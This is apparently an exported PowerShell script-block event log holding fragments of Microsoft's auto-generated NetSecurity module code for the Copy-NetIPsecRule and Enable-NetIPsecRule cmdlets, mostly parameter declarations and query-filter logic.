      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecRule' -Alias '*'
        

function Enable-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (15 of 23):
'ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1Au

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (14 of 23):
r(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
